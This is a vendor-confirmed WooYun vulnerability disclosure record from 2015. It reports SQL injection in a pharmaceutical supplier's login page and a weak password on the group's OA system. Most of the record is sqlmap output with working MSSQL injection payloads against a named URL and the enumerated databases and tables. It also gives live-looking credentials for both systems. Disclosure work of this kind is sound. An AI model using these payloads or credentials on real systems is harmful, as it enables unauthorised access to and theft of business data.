{"id": 65410, "wybug_id": "wooyun-2015-0134200", "wybug_title": "华润药业某省供应商后台sql注入导致大量药物供应泄露（附药物总集团OA弱口令）", "wybug_corp": "华润三九医药股份有限公司", "wybug_author": "路人甲", "wybug_date": "2015-08-15 15:34", "wybug_open_date": "2015-10-01 10:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向公众公开  简要描述： - 详细说明：  http://www.crsdyy.com/ptsj/login.asp山东供应商\nsqlmap identified the following injection points with a total of 68 HTTP(s) requests:---Place: POSTParameter: uname    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: uname=111' AND 8253=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (8253=8253) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58))) AND 'ysli'='ysli&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: uname=111' UNION ALL SELECT CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+CHAR(102)+CHAR(103)+CHAR(84)+CHAR(80)+CHAR(66)+CHAR(114)+CHAR(104)+CHAR(90)+CHAR(105)+CHAR(73)+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL-- &action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uname=111'; WAITFOR DELAY '0:0:5';--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uname=111' WAITFOR DELAY '0:0:5'--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: uname    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: uname=111' AND 8253=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (8253=8253) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58))) AND 'ysli'='ysli&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: uname=111' UNION ALL SELECT CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+CHAR(102)+CHAR(103)+CHAR(84)+CHAR(80)+CHAR(66)+CHAR(114)+CHAR(104)+CHAR(90)+CHAR(105)+CHAR(73)+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL-- &action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uname=111'; WAITFOR DELAY '0:0:5';--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uname=111' WAITFOR DELAY '0:0:5'--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC---available databases [9]:[*] master[*] model[*] msdb[*] sdgs[*] shxt[*] sjcj[*] sjzl[*] syxh[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: uname    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: uname=111' AND 8253=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (8253=8253) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58))) AND 'ysli'='ysli&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: uname=111' UNION ALL SELECT CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+CHAR(102)+CHAR(103)+CHAR(84)+CHAR(80)+CHAR(66)+CHAR(114)+CHAR(104)+CHAR(90)+CHAR(105)+CHAR(73)+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL-- &action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uname=111'; WAITFOR DELAY '0:0:5';--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uname=111' WAITFOR DELAY '0:0:5'--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC---current database:    'sdgs'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: uname    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: uname=111' AND 8253=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (8253=8253) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58))) AND 'ysli'='ysli&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: uname=111' UNION ALL SELECT CHAR(58)+CHAR(121)+CHAR(111)+CHAR(100)+CHAR(58)+CHAR(102)+CHAR(103)+CHAR(84)+CHAR(80)+CHAR(66)+CHAR(114)+CHAR(104)+CHAR(90)+CHAR(105)+CHAR(73)+CHAR(58)+CHAR(111)+CHAR(108)+CHAR(104)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL-- &action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: uname=111'; WAITFOR DELAY '0:0:5';--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: uname=111' WAITFOR DELAY '0:0:5'--&action=1&password=1111&submit=%B5%C7%26%23160%3B%26%23160%3B%C2%BC---Database: sdgs[25 tables]+--------------------+| dbo.biuser_bak     || dbo.bulist         || dbo.download       || dbo.download_type  || dbo.fwl            || dbo.gysuser        || dbo.ip             || dbo.link           || dbo.lxjl           || dbo.medicine_type  || dbo.news           || dbo.news_type      || dbo.product        || dbo.pt_user        || dbo.qyfc           || dbo.qyxchz         || dbo.qyxcmx         || dbo.sqlmapoutput   || dbo.sysuser        || dbo.v_search       || dbo.zhaoshang      || dbo.zhaoshang_oid  || dbo.zhaoshang_type || dbo.zlzx           || dbo.zlzx_type      |+--------------------+\n测试账号 013001/888888进价和供应途径都泄露了 价格对药品应该很重要把\n\n\n\nhttp://114.251.20.5:8080/seeyon/index.jsp 集团弱口令一枚123456/123456\n\n   漏洞证明：  \n\n   修复方案：  修复注入和弱口令   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-17 10:25 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}